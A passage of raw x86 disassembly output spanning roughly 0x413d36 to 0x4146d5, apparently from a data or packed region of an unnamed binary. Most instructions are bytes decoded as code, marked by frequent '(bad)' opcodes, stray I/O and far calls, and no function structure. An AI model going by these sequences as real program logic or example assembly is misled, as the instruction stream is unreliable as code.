  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	cmp    BYTE PTR [eax+0x2c],bh
  413f03:	or     esp,ebx
  413f05:	rol    DWORD PTR [eax],1
  413f07:	add    BYTE PTR [ecx+eax*1],al
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	or     esp,DWORD PTR [esi+0x242564a5]
  413f12:	push   DWORD PTR [eax+0x2c]
  413f15:	push   esi
  413f16:	mov    ds:0xbf231e49,eax
  413f1b:	adc    eax,DWORD PTR [ebx]
  413f1d:	jnp    0x413eb5
  413f1f:	or     eax,0xa9adc798
  413f24:	cs aam 0x11
  413f27:	xor    ecx,ebx
  413f29:	mov    dh,0x56
  413f2b:	aam    0x9d
  413f2d:	fbld   TBYTE PTR [edi+edi*1]
  413f30:	sub    dl,ch
  413f32:	push   ecx
  413f33:	mov    ebx,0x99be7351
  413f38:	je     0x413f4c
  413f3a:	inc    ecx
  413f3b:	mov    al,0xf4
  413f3d:	mov    ds:0xab1139c6,al
  413f42:	sbb    ecx,DWORD PTR [esi-0x65]
  413f45:	pop    ss
  413f46:	dec    ebx
  413f47:	out    0xef,eax
  413f49:	mov    esi,0x208e4e90
  413f4e:	cs clc 
  413f50:	cld    
  413f51:	sbb    eax,DWORD PTR [ecx+0x5f]
  413f54:	call   DWORD PTR [esi]
  413f56:	test   BYTE PTR [esi],al
  413f58:	push   eax
  413f59:	pop    ebx
  413f5a:	nop
  413f5b:	cli    
  413f5c:	jns    0x413f92
  413f5e:	add    ebp,edx
  413f60:	push   ebp
  413f61:	and    al,0x99
  413f63:	gs dec esi
  413f65:	inc    esi
  413f66:	ins    BYTE PTR es:[edi],dx
  413f67:	adc    eax,0x8d20712c
  413f6c:	sti    
  413f6d:	inc    esi
  413f6e:	inc    edi
  413f6f:	test   ah,bh
  413f71:	mov    dl,0xf6
  413f73:	and    al,0x17
  413f75:	and    dl,BYTE PTR [esi+0x4fa171e]
  413f7b:	rcr    BYTE PTR [ebx],cl
  413f7d:	jecxz  0x413f14
  413f7f:	(bad)
  413f83:	es std 
  413f85:	test   BYTE PTR [edi+eiz*4+0x42f72cda],cl
  413f8c:	shl    DWORD PTR [edx-0x13d4ebd6],1
  413f92:	inc    ebx
  413f93:	addr16 popa 
  413f95:	mov    bl,0x2c
  413f97:	adc    al,0x8
  413f99:	into   
  413f9a:	(bad)  [ebx]
  413f9c:	mov    ebp,0x8ccb15c2
  413fa1:	xchg   esi,eax
  413fa2:	int    0xf9
  413fa4:	cld    
  413fa5:	clc    
  413fa6:	fcmovne st,st(7)
  413fa8:	xor    edi,edi
  413faa:	(bad)  
  413fab:	pushf  
  413fac:	retf   
  413fad:	mov    ah,BYTE PTR [ebx+0x48dd6dd7]
  413fb3:	add    ebx,DWORD PTR [edx+ebp*1+0x1c36fa87]
  413fba:	(bad)  
  413fbb:	aas    
  413fbc:	fidiv  WORD PTR ds:0x2321d79f
  413fc2:	in     eax,0x80
  413fc4:	adc    edx,esp
  413fc6:	sub    DWORD PTR [esi],0xfffffffb
  413fc9:	jne    0x413ff6
  413fcb:	(bad)  
  413fcc:	cmp    eax,0xa01d2c4b
  413fd1:	jg     0x413ff9
  413fd3:	imul   edi,DWORD PTR [edi+0x44],0xffffff99
  413fd7:	call   0x97e5:0xcbf27d93
  413fde:	add    esp,DWORD PTR [edi]
  413fe0:	fmul   QWORD PTR [edx]
  413fe2:	ror    BYTE PTR [edx-0x51],1
  413fe5:	repz add ecx,DWORD PTR ds:0x8195e8d3
  413fec:	mov    edi,0xb226ee47
  413ff1:	sub    eax,0x276beab7
  413ff6:	es scas al,BYTE PTR es:[edi]
  413ff8:	retf   
  413ff9:	ss in  al,0xc1
  413ffc:	enter  0xd3d,0x75
  414000:	out    dx,al
  414001:	rcr    DWORD PTR [ebx],0xf8
  414004:	sbb    ah,BYTE PTR [ebp+0x23]
  414007:	and    BYTE PTR [eax],dh
  414009:	add    BYTE PTR [ecx-0x45],bl
  41400c:	dec    ebp
  41400d:	cmp    eax,0x8d1
	...
  414072:	add    BYTE PTR [eax],al
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x2699:0xd8d52e96
  414083:	aas    
  414084:	loopne 0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    al,0x1
  41408a:	add    BYTE PTR [eax],al
  41408c:	hlt    
  41408d:	mov    gs,edx
  41408f:	(bad)  
  414090:	repz int 0x74
  414093:	xchg   esp,eax
  414094:	jb     0x414058
  414096:	stos   BYTE PTR es:[edi],al
  414097:	mov    bl,0xc2
  414099:	add    ebx,edx
  41409b:	int    0x2d
  41409d:	je     0x414071
  41409f:	retf   0x5e4
  4140a2:	popa   
  4140a3:	popf   
  4140a4:	add    DWORD PTR [edx+esi*4],esi
  4140a7:	bound  eax,QWORD PTR [ebx+0x31]
  4140aa:	sbb    BYTE PTR [eax],0x61
  4140ad:	inc    ecx
  4140ae:	je     0x4140b5
  4140b0:	push   eax
  4140b1:	fist   WORD PTR [ecx]
  4140b3:	fisub  WORD PTR [esi+0x4e42b738]
  4140b9:	sbb    al,BYTE PTR [edx+0x37089197]
  4140bf:	ja     0x414081
  4140c1:	or     esi,DWORD PTR [eax-0x4179b4cd]
  4140c7:	push   eax
  4140c8:	inc    edi
  4140c9:	arpl   WORD PTR [esi+edi*4],bp
  4140cc:	jns    0x414056
  4140ce:	mov    ch,0xad
  4140d0:	sub    BYTE PTR [bx+0x2a],dh
  4140d4:	and    bh,BYTE PTR [eax-0x5b37ec13]
  4140da:	push   ds
  4140db:	inc    ebp
  4140dc:	push   eax
  4140dd:	pushf  
  4140de:	xor    ecx,edi
  4140e0:	inc    ecx
  4140e1:	sar    BYTE PTR [ecx-0x28],1
  4140e4:	jp     0x414155
  4140e6:	pop    edi
  4140e7:	dec    edi
  4140e8:	cmp    eax,0xc29057ed
  4140ed:	jnp    0x4140b5
  4140ef:	imul   edi,DWORD PTR [ecx+0x479fbb6a],0xc816450d
  4140f9:	push   esp
  4140fa:	sub    al,0x96
  4140fc:	inc    ecx
  4140fd:	xchg   ebp,eax
  4140fe:	jmp    FWORD PTR [ecx-0x22a0f80]
  414104:	add    eax,ecx
  414106:	sbb    eax,0x9e5f2a27
  41410b:	arpl   WORD PTR [eax+esi*8-0x2c5b0d19],bp
  414112:	push   edx
  414113:	test   BYTE PTR [esp+ebx*8+0x36],cl
  414117:	arpl   WORD PTR [edi-0x33],si
  41411a:	adc    DWORD PTR [esi],edi
  41411c:	sub    eax,0x1e18fc05
  414121:	mov    eax,ds:0x2b3b7cee
  414126:	sbb    DWORD PTR [edi+0x21],esp
  414129:	xlat   BYTE PTR ds:[ebx]
  41412a:	in     al,dx
  41412b:	dec    ebp
  41412c:	stos   BYTE PTR es:[edi],al
  41412d:	push   es
  41412e:	rcr    BYTE PTR [edx+0x5f],cl
  414131:	inc    ecx
  414132:	mov    eax,0x3f391283
  414137:	push   esp
  414138:	pop    edx
  414139:	fist   DWORD PTR ds:0xf0edda4d
  41413f:	mov    edi,0x8deb6b77
  414144:	add    dl,dh
  414146:	mov    DWORD PTR ds:0xa0b69638,edi
  41414c:	sub    ch,bh
  41414e:	mov    ds:0xf4c8b88e,eax
  414153:	xchg   DWORD PTR [edi+0x1d9e85a1],esp
  414159:	ficom  DWORD PTR [ebp+0x46]
  41415c:	sub    DWORD PTR [ebx-0x1f],eax
  41415f:	sub    BYTE PTR [edx-0x36420cda],dh
  414165:	icebp  
  414166:	pop    ss
  414167:	cmp    eax,0x1bc92b59
  41416c:	mov    ch,0x25
  41416e:	sbb    al,BYTE PTR [ebx]
  414170:	int    0xc9
  414172:	push   cs
  414173:	inc    ecx
  414174:	shl    ebx,1
  414176:	test   al,0x23
  414178:	jns    0x414161
  41417a:	retf   0x9f70
  41417d:	test   BYTE PTR [eax-0x43baeb5b],dl
  414183:	js     0x41411e
  414185:	ret    
  414186:	shr    BYTE PTR [edi],cl
  414188:	inc    ecx
  414189:	dec    ebx
  41418a:	mov    cx,0x6dfb
  41418e:	push   ebp
  41418f:	inc    ebp
	...
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	sbb    eax,0xe43ab471
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR [ecx+eax*1],al
  41420a:	add    BYTE PTR [eax],al
  41420c:	mov    dl,0x34
  41420e:	test   BYTE PTR [esi],bh
  414210:	inc    esi
  414211:	lahf   
  414212:	mov    ds:0x64237cdc,eax
  414217:	xchg   esi,eax
  414218:	sahf   
  414219:	xor    dh,BYTE PTR [eax-0x16c4169d]
  41421f:	adc    esp,DWORD PTR [ebx+eiz*2-0x7a]
  414223:	shld   DWORD PTR [edi+eiz*2],edx,0x2f
  414228:	sbb    DWORD PTR [edi+0x5],eax
  41422b:	clc    
  41422c:	lahf   
  41422d:	jge    0x4142ad
  41422f:	bound  esp,QWORD PTR ds:0x66aebcd3
  414235:	ret    0x6a21
  414238:	cld    
  414239:	push   ebx
  41423a:	cmp    dh,BYTE PTR [ebx-0x79b11564]
  414240:	cs gs int 0x6a
  414244:	cs sub al,0x1f
  414247:	dec    edi
  414248:	mov    ds:0x2d24e98a,eax
  41424d:	iret   
  41424e:	imul   ebx,ebp,0x2d
  414251:	ret    
  414252:	mov    esi,0xa608bc84
  414257:	ins    BYTE PTR es:[edi],dx
  414258:	and    BYTE PTR [eax-0x43],0xb1
  41425c:	cmp    BYTE PTR [eax],ah
  41425e:	add    DWORD PTR [ebp+0x51],edi
  414261:	add    eax,DWORD PTR ds:0x94387621
  414267:	movups xmm6,xmm4
  41426a:	nop
  41426b:	xor    DWORD PTR [edx-0x56e72d9f],eax
  414271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414272:	mov    al,ds:0x5523e168
  414277:	int3   
  414278:	js     0x414223
  41427a:	cmp    ch,bh
  41427c:	popa   
  41427d:	jae    0x414274
  41427f:	lea    esp,[ebx-0x619b8176]
  414285:	jmp    0xdb0:0x26bf9476
  41428c:	inc    ecx
  41428d:	enter  0x6df,0xce
  414291:	jmp    0x68add0d9
  414296:	add    eax,0x4e3b888c
  41429b:	loop   0x41421e
  41429d:	mov    bl,0xd4
  41429f:	push   esp
  4142a0:	data16 mov BYTE PTR [ebx+0x5d0b08a1],0x98
  4142a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142a9:	xchg   ecx,eax
  4142aa:	ins    BYTE PTR es:[edi],dx
  4142ab:	cmp    bh,BYTE PTR [ecx+0x7bfa01ae]
  4142b1:	in     al,dx
  4142b2:	dec    ebx
  4142b3:	iret   
  4142b4:	stos   DWORD PTR es:[edi],eax
  4142b5:	push   es
  4142b6:	fs sub eax,0x1e91a203
  4142bc:	int3   
  4142bd:	dec    eax
  4142be:	ror    DWORD PTR [ecx-0x25],0xe5
  4142c2:	(bad)  
  4142c3:	xor    DWORD PTR [ebp-0x2fd56e51],0x6950d2be
  4142cd:	cmp    BYTE PTR [ecx+0x41a5938c],ah
  4142d3:	js     0x414276
  4142d5:	jl     0x4142f3
  4142d7:	mov    edx,0xa2133003
  4142dc:	inc    esi
  4142dd:	or     al,0xf
  4142df:	pop    edi
  4142e0:	and    al,0xd6
  4142e2:	test   eax,0xd8f29a1d
  4142e7:	push   edi
  4142e8:	mov    esi,0x6209333e
  4142ed:	icebp  
  4142ee:	dec    ebp
  4142ef:	pop    edi
  4142f0:	ror    DWORD PTR [ecx+0x53ed6028],cl
  4142f6:	mov    bl,0x4c
  4142f8:	and    BYTE PTR [eax],dl
  4142fa:	or     al,cl
  4142fc:	pop    ebp
  4142fd:	inc    eax
  4142fe:	mov    eax,0x7c358fcf
  414303:	mov    ds:0xbe2c1823,eax
  414308:	retf   0xc1d3
  41430b:	pop    ecx
  41430c:	addr16 lock dec esi
  41430f:	fild   DWORD PTR [eax]
	...
  414371:	add    BYTE PTR [eax],al
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	test   eax,0xe8a6ac18
  414385:	aam    0x0
  414387:	add    BYTE PTR [ecx+eax*1],al
  41438a:	add    BYTE PTR [eax],al
  41438c:	xor    DWORD PTR [edi],0xd5d1d35f
  414392:	mov    al,0x23
  414394:	xor    al,0xa9
  414396:	inc    eax
  414398:	jle    0x414386
  41439a:	out    dx,al
  41439b:	ret    
  41439c:	sub    DWORD PTR [bx],0x1ffaf9b8
  4143a3:	or     dh,BYTE PTR [ebx]
  4143a5:	inc    edx
  4143a6:	fld1   
  4143a8:	in     al,dx
  4143a9:	fisubr WORD PTR ds:0x7f5044b8
  4143af:	cmc    
  4143b0:	jb     0x41436b
  4143b2:	call   0xd594c444
  4143b7:	fs clc 
  4143b9:	pop    ecx
  4143ba:	push   esp
  4143bb:	dec    esi
  4143bc:	xor    dh,BYTE PTR [ebp-0x30b026cb]
  4143c2:	and    DWORD PTR [ecx+0x6e],0x94296e0a
  4143c9:	push   edi
  4143ca:	xor    ah,bh
  4143cc:	ja     0x414388
  4143ce:	adc    eax,0x12e9b7d2
  4143d3:	mov    dh,ch
  4143d5:	(bad)
  4143d8:	xchg   BYTE PTR [edi-0x44d5a076],bh
  4143de:	adc    al,BYTE PTR [ebp-0x46]
  4143e1:	cmp    al,0x1d
  4143e3:	sub    DWORD PTR [eax-0x53303155],0xc09e048a
  4143ed:	bound  ebx,QWORD PTR [edx-0x8b71b8b]
  4143f3:	pop    ecx
  4143f4:	pop    ebx
  4143f5:	pop    esi
  4143f6:	retf   
  4143f7:	gs inc edi
  4143f9:	xchg   esp,eax
  4143fa:	(bad)  
  4143fb:	xor    ebx,DWORD PTR [ebp-0x7593a0bf]
  414401:	fdiv   st,st(4)
  414403:	pop    ebx
  414404:	xchg   DWORD PTR [ebx+ecx*4-0x8],edx
  414408:	mov    al,ds:0x185b54a
  41440d:	cli    
  41440e:	rol    BYTE PTR [ebx-0x5e7c0b1a],cl
  414414:	dec    esi
  414415:	test   BYTE PTR [edi+0x3a],ch
  414418:	enter  0xcc4a,0xd8
  41441c:	xlat   BYTE PTR ds:[ebx]
  41441d:	sbb    cl,BYTE PTR [ecx+0x2]
  414420:	popf   
  414421:	outs   dx,DWORD PTR ds:[esi]
  414422:	adc    eax,0x23c370d0
  414427:	push   esi
  414428:	inc    ecx
  414429:	ret    0x3a1b
  41442c:	retw   0xec95
  414430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414431:	mov    dl,0x32
  414433:	xor    bl,bh
  414435:	not    BYTE PTR [edx]
  414437:	popa   
  414438:	cld    
  414439:	aad    0x7e
  41443b:	jmp    0x414486
  41443d:	fstp   DWORD PTR [ecx]
  41443f:	loop   0x4143ff
  414441:	cli    
  414442:	mov    dl,ah
  414444:	mul    dl
  414446:	nop
  414447:	pop    ebx
  414448:	aas    
  414449:	lods   eax,DWORD PTR ds:[esi]
  41444a:	xchg   edx,eax
  41444b:	lds    esp,FWORD PTR [ecx-0xdd0d2af]
  414451:	sbb    esp,edi
  414453:	not    cl
  414455:	mov    edx,0x7f57f9c7
  41445a:	int    0x64
  41445c:	mov    ebx,DWORD PTR [ebx+0x21bbe9c9]
  414462:	sbb    DWORD PTR [edx+0x573a74cc],eax
  414468:	(bad)  
  414469:	cld    
  41446a:	pand   mm5,QWORD PTR [edx]
  41446d:	sbb    bh,BYTE PTR [esi+0x517a381b]
  414473:	xor    bl,bl
  414475:	mov    esi,ss
  414477:	stos   BYTE PTR es:[edi],al
  414478:	ret    0x6c0b
  41447b:	popa   
  41447c:	inc    esi
  41447d:	add    ecx,DWORD PTR [edi-0x51842949]
  414483:	xor    eax,0x18c603d9
  414488:	dec    esi
  414489:	nop
  41448a:	push   esp
  41448b:	ins    DWORD PTR es:[edi],dx
  41448c:	fild   WORD PTR [esi]
  41448e:	adc    DWORD PTR [eax+eax*1+0x0],ecx
	...
  4144f1:	add    BYTE PTR [eax],al
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x6]
  414501:	cmc    
  414502:	push   eax
  414503:	imul   ebp,esp,0xffffffd5
  414506:	add    BYTE PTR [eax],al
  414508:	add    al,0x1
  41450a:	add    BYTE PTR [eax],al
  41450c:	(bad)  
  41450d:	js     0x414506
  41450f:	ror    DWORD PTR [ecx-0x2089a14a],1
  414515:	icebp  
  414516:	repnz test eax,0x1b1eaf2e
  41451c:	pop    edi
  41451d:	jnp    0x414541
  41451f:	push   0xfffffffa
  414521:	push   ds
  414522:	lahf   
  414523:	push   ebx
  414524:	add    BYTE PTR [ebx-0x6],dh
  414527:	push   0xc
  414529:	adc    dl,BYTE PTR [edi-0x55]
  41452c:	adc    BYTE PTR [edx+0x59d8dbde],cl
  414532:	ret    
  414533:	sbb    al,0x2f
  414535:	sbb    BYTE PTR [ebp-0x2c],dh
  414538:	dec    edi
  414539:	fdivrp st(6),st
  41453b:	mov    eax,0xed7a74f5
  414540:	adc    edx,DWORD PTR [edi]
  414542:	xor    ebx,ebp
  414544:	jl     0x4145a2
  414546:	xchg   edx,eax
  414547:	fs jno 0x41454c
  41454a:	popa   
  41454b:	pop    esi
  41454c:	out    0x14,eax
  41454e:	mov    ebx,0x2a3542cd
  414553:	push   edx
  414554:	add    eax,0x1eeb0f03
  414559:	aam    0x4
  41455b:	ret    
  41455c:	fdivr  st(4),st
  41455e:	ror    DWORD PTR cs:[eax+0x76156bff],cl
  414565:	xor    eax,0xcede9bee
  41456a:	test   eax,0x4aee61f7
  41456f:	inc    ebp
  414570:	push   ecx
  414571:	inc    eax
  414572:	xchg   BYTE PTR [esi],cl
  414574:	in     al,dx
  414575:	push   ss
  414576:	lods   eax,DWORD PTR ds:[esi]
  414577:	dec    edi
  414578:	ret    
  414579:	out    0xa6,al
  41457b:	mov    bl,0x48
  41457d:	mov    ds,WORD PTR [ebx+0x6b5e1893]
  414583:	pop    esp
  414584:	pushf  
  414585:	push   0xcfaebe9f
  41458a:	repz dec esi
  41458c:	test   BYTE PTR cs:[ebp+eax*2+0x3ed978a3],dl
  414594:	dec    esp
  414595:	mov    ds:0xfb3428e4,eax
  41459a:	sbb    al,0xb4
  41459c:	ss mov ah,0x9
  41459f:	loop   0x4145c3
  4145a1:	ja     0x414598
  4145a3:	repnz test eax,0x9f0615af
  4145a9:	xor    esi,DWORD PTR [edi-0x2d75ec3f]
  4145af:	sbb    BYTE PTR [edi],bl
  4145b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145b2:	mov    cl,0x77
  4145b4:	repnz or ecx,0xbf941542
  4145bb:	fld    QWORD PTR [edx-0x71]
  4145be:	dec    esi
  4145bf:	sub    al,0x83
  4145c1:	mov    ?,WORD PTR [edi+0x753b0d31]
  4145c7:	inc    ebx
  4145c8:	dec    edx
  4145c9:	and    al,0x61
  4145cb:	imul   edi,ecx,0x60
  4145ce:	outs   dx,DWORD PTR ds:[esi]
  4145cf:	xor    al,0x39
  4145d1:	ret    
  4145d2:	pop    ebx
  4145d3:	cdq    
  4145d4:	jnp    0x414561
  4145d6:	mov    al,ds:0xcdaa1922
  4145db:	retf   
  4145dc:	call   0x5b82:0xc5e6836a
  4145e3:	xor    ch,bl
  4145e5:	mov    ecx,0xa80e3744
  4145ea:	and    cl,BYTE PTR [edi-0x1b]
  4145ed:	push   ebp
  4145ee:	lock inc esp
  4145f0:	fwait
  4145f1:	dec    esp
  4145f2:	xor    ebx,DWORD PTR [edx]
  4145f4:	sub    al,0x54
  4145f6:	ret    0x9600
  4145f9:	sbb    eax,0xd54af445
  4145fe:	adc    eax,0x9e3cb431
  414603:	(bad)  
  414604:	jnp    0x414659
  414606:	(bad)  
  414607:	retf   0xdcc0
  41460a:	scas   eax,DWORD PTR es:[edi]
  41460b:	pop    esp
  41460c:	pop    ebp
  41460d:	push   es
  41460e:	cli    
  41460f:	loope  0x414611
	...
  414671:	add    BYTE PTR [eax],al
  414673:	add    BYTE PTR [edi+0x5e],bh
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x51
  414681:	cmp    eax,DWORD PTR [edx+0x49]
  414684:	lock (bad) 
  414686:	add    BYTE PTR [eax],al
  414688:	add    al,0x1
  41468a:	add    BYTE PTR [eax],al
  41468c:	sub    cl,BYTE PTR [eax]
  41468e:	cli    
  41468f:	aam    0xa
  414691:	xor    esp,ecx
  414693:	dec    ecx
  414694:	shr    edi,1
  414696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414697:	push   ebp
  414698:	push   eax
  414699:	inc    esp
  41469a:	add    edi,ebx
  41469c:	jnp    0x414707
  41469e:	jns    0x4146ad
  4146a0:	jns    0x4146d8
  4146a2:	ficomp WORD PTR [edx+0x4c8d3b7a]
  4146a8:	cdq    
  4146a9:	pop    ebp
  4146aa:	xchg   ebp,eax
  4146ab:	xchg   ebp,eax
  4146ac:	or     eax,0x8fcdadf6
  4146b1:	inc    ecx
  4146b2:	out    0xd1,al
  4146b4:	xchg   esi,eax
  4146b5:	push   cs
  4146b6:	mov    ah,BYTE PTR [ecx]
  4146b8:	das    
  4146b9:	add    al,0x2b
  4146bb:	sbb    BYTE PTR [ecx-0x3f0ab942],dl
  4146c1:	xchg   ecx,eax
  4146c2:	push   esi
  4146c3:	and    esi,DWORD PTR [ecx+edi*1]
  4146c6:	mov    al,0xaa
  4146c8:	loopne 0x414743
  4146ca:	int    0x1
  4146cc:	pop    eax
  4146cd:	cmp    eax,DWORD PTR [edx-0x1e5daf0e]
  4146d3:	je     0x4146fb
  4146d5:	xchg   BYTE PTR [edi+0x1840ee1d],al
